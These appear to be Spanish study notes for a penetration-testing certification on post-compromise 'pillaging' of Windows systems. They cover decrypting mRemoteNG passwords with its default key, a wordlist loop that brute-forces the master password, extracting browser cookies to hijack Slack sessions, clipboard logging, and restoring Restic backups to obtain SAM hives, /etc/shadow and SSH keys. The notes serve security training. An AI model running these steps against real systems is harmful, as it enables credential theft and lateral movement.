
El **Pillaging** consiste en recopilar información sensible de un sistema comprometido para conseguir credenciales, escalar privilegios o facilitar el movimiento lateral.

Principales fuentes de información:

- Aplicaciones y servicios instalados.
    
- Archivos de configuración y bases de datos.
    
- Recursos compartidos.
    
- Navegadores y clientes de mensajería.
    
- Credenciales almacenadas.
    
- Portapapeles.
    
- Copias de seguridad.
    
- Servicios de infraestructura (AD, CA, servidores web, etc.).
    

---

## 1. Enumeración de aplicaciones instaladas

Identificar las aplicaciones instaladas puede revelar software vulnerable o programas que almacenan credenciales.

### CMD

```
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

### PowerShell: enumerar aplicaciones mediante el registro

```
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation

$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation

$INSTALLED | Where-Object {$_.DisplayName -ne $null} | Sort-Object -Property DisplayName -Unique | Format-Table -AutoSize
```

Consultamos dos ubicaciones:

- `HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*`: principalmente aplicaciones de 64 bits.
    
- `HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*`: principalmente aplicaciones de 32 bits.
    

**Objetivo:** encontrar aplicaciones interesantes como gestores de conexiones remotas, navegadores, clientes de mensajería o software de copias de seguridad.

## 2. mRemoteNG: extracción de credenciales

**mRemoteNG** permite gestionar conexiones remotas mediante RDP, SSH, VNC y otros protocolos.

Almacena sus conexiones y credenciales en:

```
%APPDATA%\mRemoteNG\confCons.xml
```

Si el usuario no configura una contraseña maestra personalizada, mRemoteNG utiliza la contraseña predeterminada:

```
mR3m
```

### 2.1. Localizar el archivo de configuración

```
ls C:\Users\<USER>\AppData\Roaming\mRemoteNG
```

Leer su contenido:

```
Get-Content "C:\Users\<USER>\AppData\Roaming\mRemoteNG\confCons.xml"
```

El archivo XML puede contener conexiones similares a:

```
<Node
    Name="RDP_Domain"
    Username="administrator"
    Domain="test.local"
    Password="ENCRYPTED_PASSWORD"
    Hostname="10.0.0.10"
    Protocol="RDP"
    Port="3389"
/>
```

Información interesante:

- `Username`: usuario de conexión.
    
- `Domain`: dominio.
    
- `Hostname`: máquina remota.
    
- `Protocol`: protocolo utilizado.
    
- `Password`: contraseña cifrada.
    

### 2.2. Descifrar una contraseña con la clave predeterminada

Copiamos el valor del atributo `Password` y utilizamos `mremoteng_decrypt.py`:

```
python3 mremoteng_decrypt.py -s "ENCRYPTED_PASSWORD"
```

Ejemplo de resultado:

```
Password: ASDki230kasd09fk233aDA
```

### 2.3. Descifrar con una contraseña maestra personalizada

Si conocemos la contraseña maestra:

```
python3 mremoteng_decrypt.py -s "ENCRYPTED_PASSWORD" -p admin
```

Si utilizamos una contraseña incorrecta, podemos obtener:

```
ValueError: MAC check failed
```

Esto indica que no se ha podido verificar el descifrado.

### 2.4. Ataque de diccionario contra la contraseña maestra

Podemos probar contraseñas de un diccionario:

```
for password in $(cat /usr/share/wordlists/fasttrack.txt); do
    echo "$password"
    python3 mremoteng_decrypt.py -s "ENCRYPTED_PASSWORD" -p "$password" 2>/dev/null
done
```

Cuando encuentra la contraseña correcta, el script muestra la contraseña descifrada.

También podemos atacar el atributo `Protected` del elemento raíz del XML.

**Diferencia:**

- Atacar `Protected`: cuando acertamos, aparece `Password: ThisIsProtected`.
    
- Atacar `Password`: cuando acertamos, aparece la contraseña real de la conexión.

## 3. Clientes de mensajería: cookies y tokens

Aplicaciones como Slack o Microsoft Teams pueden contener:

- Contraseñas compartidas entre empleados.
    
- Credenciales de servicios.
    
- Información interna.
    
- Datos de infraestructura.
    
- Documentación sensible.
    

Las sesiones de estas aplicaciones pueden depender de cookies o tokens de autenticación.

### Firefox

Firefox almacena las cookies en una base de datos SQLite:

```
%APPDATA%\Mozilla\Firefox\Profiles\<PROFILE>\cookies.sqlite
```

Podemos localizarla mediante PowerShell:

```
Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*\cookies.sqlite"
```

Para realizar una copia de análisis de nuestro propio perfil o de un perfil autorizado:

```
Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite" .
```

La sección utiliza `cookieextractor.py` para analizar la base de datos y explica que la cookie `d` de Slack podía contener información de autenticación.

### Navegadores Chromium

Chrome también utiliza SQLite, pero los valores de determinadas cookies están protegidos mediante mecanismos de cifrado vinculados al usuario, como **DPAPI**.

Ubicación utilizada en el ejemplo de Academy:

```
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies
```

La herramienta mencionada es `SharpChromium`.

**Problema de compatibilidad del ejemplo:**

SharpChromium buscaba:

```
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
```

Pero Chrome había movido la base de datos a:

```
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies
```

Por tanto, las herramientas antiguas pueden fallar debido a cambios en las rutas o en los mecanismos de protección de los navegadores.

**Importante:** las cookies de sesión son credenciales sensibles. La sección demuestra que una sesión autenticada puede representar un riesgo si sus tokens quedan expuestos.

## 4. Portapapeles (Clipboard)

Los usuarios pueden copiar contraseñas desde gestores de contraseñas y pegarlas en formularios.

Esto significa que un keylogger tradicional podría no capturar esas contraseñas, porque el usuario no las escribe con el teclado.

El portapapeles puede contener:

- Usuarios.
    
- Contraseñas.
    
- Tokens.
    
- Códigos de autenticación.
    
- Información sensible.
    

### Consultar el portapapeles de nuestra sesión

```
Get-Clipboard
```

Academy también presenta `Invoke-ClipboardLogger`, una herramienta que monitoriza cambios en el portapapeles.

Esta técnica requiere especial cuidado porque puede exponer credenciales y tokens de autenticación de la sesión monitorizada.

## 5. Enumeración de roles y servicios

Después de comprometer un equipo, debemos identificar qué función desempeña dentro de la infraestructura.

Servicios interesantes:

- Servidores de archivos.
    
- Servidores de impresión.
    
- Servidores web.
    
- Servidores de bases de datos.
    
- Autoridades de certificación.
    
- Servidores de código fuente.
    
- Servidores de copias de seguridad.
    

Los servidores de copias de seguridad son especialmente interesantes porque pueden almacenar información procedente de múltiples máquinas.

Además, las cuentas utilizadas para realizar backups suelen necesitar permisos elevados sobre los sistemas respaldados.

## 6. Restic: enumeración y restauración de backups

**Restic** es una herramienta de copias de seguridad compatible con Windows y Linux.

Academy utiliza la versión `0.13.1`.

En el laboratorio, el ejecutable está ubicado en:

```
C:\Windows\System32\restic.exe
```

Restic almacena las copias de seguridad en repositorios protegidos por contraseña.

La variable de entorno utilizada para proporcionar la contraseña es:

```
$env:RESTIC_PASSWORD
```

### 6.1. Crear e inicializar un repositorio

```
mkdir E:\restic2

restic.exe -r E:\restic2 init
```

Restic solicitará una contraseña para proteger el repositorio.

### 6.2. Configurar la contraseña

```
$env:RESTIC_PASSWORD = 'Password'
```

Esto evita tener que introducirla manualmente en cada operación.

### 6.3. Crear una copia de seguridad

```
restic.exe -r E:\restic2 backup C:\SampleFolder
```

Ejemplo:

```
snapshot 9971e881 saved
```

Cada backup genera un identificador de snapshot.

### 6.4. Crear una copia utilizando VSS

Podemos utilizar:

```
restic.exe -r E:\restic2 backup C:\Windows\System32\config --use-fs-snapshot
```

La opción:

```
--use-fs-snapshot
```

Utiliza **Volume Shadow Copy Service (VSS)** para intentar respaldar archivos que puedan estar siendo utilizados por Windows.

**Importante:** VSS no elimina las restricciones de permisos.

Si no tenemos acceso a un archivo, podemos obtener:

```
Access is denied.
```

Restic puede crear el snapshot aunque determinados archivos no se hayan copiado.

### 6.5. Enumerar snapshots existentes

```
restic.exe -r E:\restic2 snapshots
```

Ejemplo:

```
ID        Time                 Host             Paths
--------------------------------------------------------------
9971e881  2022-08-09 14:18:59  PILLAGING-WIN01  C:\SampleFolder
b0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01  C:\Windows\System32\config
afba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01  C:\Users\jeff\Documents
```

Esto permite identificar:

- Máquinas respaldadas.
    
- Directorios incluidos.
    
- Fechas de las copias.
    
- Identificadores de snapshots.
    

### 6.6. Restaurar un snapshot

```
restic.exe -r E:\restic2 restore 9971e881 --target C:\Restore
```

La estructura original se conserva.

Por ejemplo, si respaldamos:

```
C:\SampleFolder
```

Se restaurará en:

```
C:\Restore\C\SampleFolder
```

### 6.7. Qué buscar en los backups

**Backups de Windows:**

```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
web.config
Archivos de configuración de aplicaciones
Directorios de usuarios
```

**Backups de Linux:**

```
/etc/shadow
/home/<USER>/.ssh/
Archivos de configuración web
Archivos con credenciales
```

Estos archivos pueden contener hashes, claves privadas o credenciales que permitan obtener más acceso.

**Nota:** necesitamos conocer la contraseña del repositorio Restic para acceder a los snapshots.

## 7. Metodología práctica para CPTS/OSCP

### Enumeración

**1. Identificar aplicaciones instaladas.**

```
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*

$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*

$INSTALLED | Where-Object {$_.DisplayName -ne $null} | Sort-Object DisplayName -Unique | Format-Table DisplayName, DisplayVersion, InstallLocation -AutoSize
```

**2. Buscar aplicaciones que almacenen credenciales.**

Ejemplo: mRemoteNG.

```
Get-ChildItem "$env:APPDATA\mRemoteNG"
```

**3. Revisar archivos de configuración.**

```
Get-Content "$env:APPDATA\mRemoteNG\confCons.xml"
```

**4. Comprobar si existen navegadores y clientes de mensajería.**

Identificar perfiles, bases de datos y posibles ubicaciones de información sensible.

**5. Identificar software de backups.**

Buscar repositorios y aplicaciones como Restic.

**6. Enumerar snapshots disponibles.**

```
restic.exe -r E:\restic2 snapshots
```

**7. Restaurar copias relevantes cuando dispongamos de autorización y credenciales.**

```
restic.exe -r E:\restic2 restore <SNAPSHOT_ID> --target C:\Restore
```

**8. Analizar la información obtenida.**

Priorizar:

- Credenciales de cuentas privilegiadas.
    
- Configuraciones de aplicaciones.
    
- Información de servidores.
    
- Claves privadas.
    
- Archivos de bases de datos.
    
- Documentación de infraestructura.

## 9. Puntos clave para el examen

- **Pillaging:** búsqueda de información sensible después de comprometer un sistema.
    
- **Registro de Windows:** permite enumerar aplicaciones instaladas y sus versiones.
    
- **mRemoteNG:** almacena conexiones y contraseñas cifradas en `confCons.xml`.
    
- **mRemoteNG sin contraseña maestra personalizada:** utiliza `mR3m`.
    
- **mremoteng_decrypt.py:** permite descifrar credenciales cuando conocemos o recuperamos la contraseña maestra.
    
- **Firefox:** almacena cookies en `cookies.sqlite`.
    
- **Chromium:** utiliza SQLite y mecanismos de protección como DPAPI.
    
- **Portapapeles:** puede contener contraseñas copiadas desde gestores de credenciales.
    
- **Servidores de backups:** pueden almacenar información de múltiples sistemas.
    
- **Restic:** utiliza repositorios cifrados y snapshots.
    
- **RESTIC_PASSWORD:** variable de entorno para proporcionar la contraseña del repositorio.
    
- **restic snapshots:** enumera copias de seguridad existentes.
    
- **restic restore:** restaura un snapshot.
    
- **VSS:** permite crear instantáneas de volúmenes, pero no evita las restricciones de acceso.
    

**Idea principal:** después de obtener acceso a una máquina, no debemos limitarnos a buscar vulnerabilidades locales. Las aplicaciones instaladas, sus archivos de configuración y las copias de seguridad pueden proporcionar credenciales e información que permitan avanzar en la evaluación.
